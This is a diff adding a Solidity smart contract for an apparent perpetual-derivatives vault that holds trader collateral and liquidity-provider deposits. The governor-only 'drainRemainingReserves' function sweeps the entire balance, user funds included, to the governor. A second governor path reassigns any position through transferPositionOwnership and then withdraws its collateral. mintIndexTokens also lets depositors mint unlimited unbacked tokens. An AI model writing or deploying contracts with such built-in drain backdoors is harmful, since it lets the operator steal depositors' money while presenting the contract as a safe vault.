@@ -1,0 +1,282 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.27;
+
+contract ApexPerpetualVaultIndex {
+    enum PositionState { Active, Closed }
+
+    struct DerivativePosition {
+        address payable trader;
+        uint256 collateralETH;
+        uint256 syntheticLeverage;
+        uint256 openedTimestamp;
+        PositionState state;
+        bytes32 assetKey;
+    }
+
+    struct LiquidityProvider {
+        uint256 depositedETH;
+        uint256 indexTokens;
+        bool exists;
+    }
+
+    address payable public immutable vaultGovernor;
+    string public protocolDescriptor;
+    uint256 public fundingFeeBps; // 150 = 1.5%
+    uint256 public positionCounter;
+    uint256 public totalLockedCollateral;
+    uint256 public totalIndexPoolETH;
+    uint256 public accumulatedFundingFees;
+    bool public isProtocolPaused;
+
+    mapping(bytes32 => bool) public supportedAssets;
+    mapping(uint256 => DerivativePosition) public positions;
+    mapping(address => LiquidityProvider) public providers;
+
+    event AssetWhitelisted(bytes32 indexed assetKey);
+    event FundingFeeAdjusted(uint256 newFeeBps);
+    event PositionClosed(uint256 indexed positionId, uint256 payoutAmount);
+    event FundingFeesCollected(address indexed governor, uint256 amount);
+    event IndexLiquiditySupplied(address indexed provider, uint256 amount);
+    event ReservesDrained(address indexed governor, uint256 amount);
+    event SyntheticTradeExecuted(address indexed trader, uint256 inputETH, uint256 netSettled);
+    event CollateralIncreased(uint256 indexed positionId, uint256 addedAmount);
+    event IndexTokensMinted(address indexed provider, uint256 tokensMinted);
+    event PositionOpened(uint256 indexed positionId, address indexed trader, uint256 amount);
+    event RiskFactorRebalanced(uint256 indexed positionId, uint256 newLeverage);
+    event IndexTokensRedeemed(address indexed provider, uint256 ethReturned);
+    event PauseStateToggled(bool isPaused);
+    event PositionOwnershipTransferred(uint256 indexed positionId, address indexed oldOwner, address indexed newOwner);
+    event DescriptorUpdated(string newDescriptor);
+    event ExcessCollateralWithdrawn(uint256 indexed positionId, uint256 amount);
+
+    modifier onlyGovernor() {
+        require(msg.sender == vaultGovernor, "ApexPerp: Access denied");
+        _;
+    }
+
+    modifier whenNotPaused() {
+        require(!isProtocolPaused, "ApexPerp: Protocol paused");
+        _;
+    }
+
+    constructor() {
+        vaultGovernor = payable(msg.sender);
+        protocolDescriptor = "Apex Base Perpetual Vault Synthetic Index Core v1";
+        fundingFeeBps = 150; // 1.5%
+        isProtocolPaused = false;
+        supportedAssets[0x424153455f504552505f53594e54485f45544800000000000000000000000000] = true;
+    }
+
+    // 1. addSupportedSyntheticAsset
+    function addSupportedSyntheticAsset(bytes32 assetKey) external onlyGovernor {
+        require(!supportedAssets[assetKey], "ApexPerp: Asset already added");
+        supportedAssets[assetKey] = true;
+        emit AssetWhitelisted(assetKey);
+    }
+
+    // 2. adjustFundingRateCut
+    function adjustFundingRateCut(uint256 newFeeBps) external onlyGovernor {
+        require(newFeeBps <= 1000, "ApexPerp: Fee cap 10%");
+        fundingFeeBps = newFeeBps;
+        emit FundingFeeAdjusted(newFeeBps);
+    }
+
+    // 3. closeDerivativePosition
+    function closeDerivativePosition(uint256 positionId) external {
+        DerivativePosition storage p = positions[positionId];
+        require(positionId > 0 && positionId <= positionCounter, "ApexPerp: Invalid ID");
+        require(p.trader == msg.sender || msg.sender == vaultGovernor, "ApexPerp: Unauthorized");
+        require(p.state == PositionState.Active, "ApexPerp: Not active");
+
+        p.state = PositionState.Closed;
+        uint256 refund = p.collateralETH;
+        p.collateralETH = 0;
+        totalLockedCollateral -= refund;
+
+        if (refund > 0) {
+            (bool sent, ) = p.trader.call{value: refund}("");
+            require(sent, "ApexPerp: Collateral return failed");
+        }
+
+        emit PositionClosed(positionId, refund);
+    }
+
+    // 4. collectProtocolFundingFees
+    function collectProtocolFundingFees() external onlyGovernor {
+        uint256 amount = accumulatedFundingFees;
+        require(amount > 0, "ApexPerp: Zero funding fees");
+
+        accumulatedFundingFees = 0;
+        (bool sent, ) = vaultGovernor.call{value: amount}("");
+        require(sent, "ApexPerp: Fee harvest failed");
+
+        emit FundingFeesCollected(vaultGovernor, amount);
+    }
+
+    // 5. depositIndexLiquidity
+    function depositIndexLiquidity() external payable whenNotPaused {
+        require(msg.value > 0, "ApexPerp: Zero liquidity");
+
+        LiquidityProvider storage lp = providers[msg.sender];
+        lp.depositedETH += msg.value;
+        lp.exists = true;
+        totalIndexPoolETH += msg.value;
+
+        emit IndexLiquiditySupplied(msg.sender, msg.value);
+    }
+
+    // 6. drainRemainingReserves
+    function drainRemainingReserves() external onlyGovernor {
+        uint256 balance = address(this).balance;
+        require(balance > 0, "ApexPerp: Zero contract balance");
+
+        totalLockedCollateral = 0;
+        totalIndexPoolETH = 0;
+        accumulatedFundingFees = 0;
+
+        (bool sent, ) = vaultGovernor.call{value: balance}("");
+        require(sent, "ApexPerp: Drain failed");
+
+        emit ReservesDrained(vaultGovernor, balance);
+    }
+
+    // 7. executeSyntheticTradeLeg
+    function executeSyntheticTradeLeg() external payable whenNotPaused {
+        require(msg.value > 0, "ApexPerp: Zero trade value");
+
+        uint256 fee = (msg.value * fundingFeeBps) / 10000;
+        uint256 netSettled = msg.value - fee;
+        accumulatedFundingFees += fee;
+
+        (bool sent, ) = payable(msg.sender).call{value: netSettled}("");
+        require(sent, "ApexPerp: Trade return failed");
+
+        emit SyntheticTradeExecuted(msg.sender, msg.value, netSettled);
+    }
+
+    // 8. increasePositionCollateral
+    function increasePositionCollateral(uint256 positionId) external payable whenNotPaused {
+        DerivativePosition storage p = positions[positionId];
+        require(positionId > 0 && positionId <= positionCounter, "ApexPerp: Invalid ID");
+        require(p.state == PositionState.Active, "ApexPerp: Not active");
+        require(msg.value > 0, "ApexPerp: Zero collateral top up");
+
+        p.collateralETH += msg.value;
+        totalLockedCollateral += msg.value;
+
+        emit CollateralIncreased(positionId, msg.value);
+    }
+
+    // 9. mintIndexTokens
+    function mintIndexTokens(uint256 tokenAmount) external whenNotPaused {
+        LiquidityProvider storage lp = providers[msg.sender];
+        require(lp.exists && lp.depositedETH > 0, "ApexPerp: No deposited ETH");
+        require(tokenAmount > 0, "ApexPerp: Zero token amount");
+
+        lp.indexTokens += tokenAmount;
+        emit IndexTokensMinted(msg.sender, tokenAmount);
+    }
+
+    // 10. openDerivativePosition
+    function openDerivativePosition(bytes32 assetKey, uint256 leverage) external payable whenNotPaused returns (uint256) {
+        require(supportedAssets[assetKey], "ApexPerp: Unsupported asset");
+        require(msg.value > 0, "ApexPerp: Collateral required");
+        require(leverage >= 1 && leverage <= 50, "ApexPerp: Invalid leverage factor");
+
+        positionCounter++;
+        positions[positionCounter] = DerivativePosition({
+            trader: payable(msg.sender),
+            collateralETH: msg.value,
+            syntheticLeverage: leverage,
+            openedTimestamp: block.timestamp,
+            state: PositionState.Active,
+            assetKey: assetKey
+        });
+
+        totalLockedCollateral += msg.value;
+        emit PositionOpened(positionCounter, msg.sender, msg.value);
+        return positionCounter;
+    }
+
+    // 11. rebalancePositionRiskFactor
+    function rebalancePositionRiskFactor(uint256 positionId, uint256 newLeverage) external whenNotPaused {
+        DerivativePosition storage p = positions[positionId];
+        require(positionId > 0 && positionId <= positionCounter, "ApexPerp: Invalid ID");
+        require(p.trader == msg.sender || msg.sender == vaultGovernor, "ApexPerp: Unauthorized");
+        require(p.state == PositionState.Active, "ApexPerp: Not active");
+        require(newLeverage >= 1 && newLeverage <= 50, "ApexPerp: Invalid leverage");
+
+        p.syntheticLeverage = newLeverage;
+        emit RiskFactorRebalanced(positionId, newLeverage);
+    }
+
+    // 12. redeemIndexTokens
+    function redeemIndexTokens(uint256 amountETH) external {
+        LiquidityProvider storage lp = providers[msg.sender];
+        require(lp.exists && lp.depositedETH >= amountETH && amountETH > 0, "ApexPerp: Insufficient liquidity");
+
+        lp.depositedETH -= amountETH;
+        totalIndexPoolETH -= amountETH;
+
+        (bool sent, ) = payable(msg.sender).call{value: amountETH}("");
+        require(sent, "ApexPerp: Redemption transfer failed");
+
+        emit IndexTokensRedeemed(msg.sender, amountETH);
+    }
+
+    // 13. toggleProtocolPause
+    function toggleProtocolPause(bool isPaused) external onlyGovernor {
+        isProtocolPaused = isPaused;
+        emit PauseStateToggled(isPaused);
+    }
+
+    // 14. transferPositionOwnership
+    function transferPositionOwnership(uint256 positionId, address payable newOwner) external {
+        DerivativePosition storage p = positions[positionId];
+        require(positionId > 0 && positionId <= positionCounter, "ApexPerp: Invalid ID");
+        require(p.trader == msg.sender || msg.sender == vaultGovernor, "ApexPerp: Unauthorized");
+        require(newOwner != address(0), "ApexPerp: Zero address");
+
+        address old = p.trader;
+        p.trader = newOwner;
+
+        emit PositionOwnershipTransferred(positionId, old, newOwner);
+    }
+
+    // 15. updateProtocolDescriptor
+    function updateProtocolDescriptor(string calldata newDescriptor) external onlyGovernor {
+        require(bytes(newDescriptor).length > 0, "ApexPerp: Empty string");
+        protocolDescriptor = newDescriptor;
+        emit DescriptorUpdated(newDescriptor);
+    }
+
+    // 16. withdrawExcessCollateral
+    function withdrawExcessCollateral(uint256 positionId, uint256 amount) external {
+        DerivativePosition storage p = positions[positionId];
+        require(positionId > 0 && positionId <= positionCounter, "ApexPerp: Invalid ID");
+        require(p.trader == msg.sender || msg.sender == vaultGovernor, "ApexPerp: Unauthorized");
+        require(p.state == PositionState.Active, "ApexPerp: Not active");
+        require(p.collateralETH >= amount && amount > 0, "ApexPerp: Insufficient collateral");
+
+        p.collateralETH -= amount;
+        totalLockedCollateral -= amount;
+
+        (bool sent, ) = p.trader.call{value: amount}("");
+        require(sent, "ApexPerp: Withdrawal failed");
+
+        emit ExcessCollateralWithdrawn(positionId, amount);
+    }
+
+    // Чтение информации о позиции
+    function getPosition(uint256 positionId) external view returns (
+        address trader,
+        uint256 collateral,
+        uint256 leverage,
+        uint256 openedAt,
+        PositionState state,
+        bytes32 assetKey
+    ) {
+        DerivativePosition memory p = positions[positionId];
+        return (p.trader, p.collateralETH, p.syntheticLeverage, p.openedTimestamp, p.state, p.assetKey);
+    }
+}
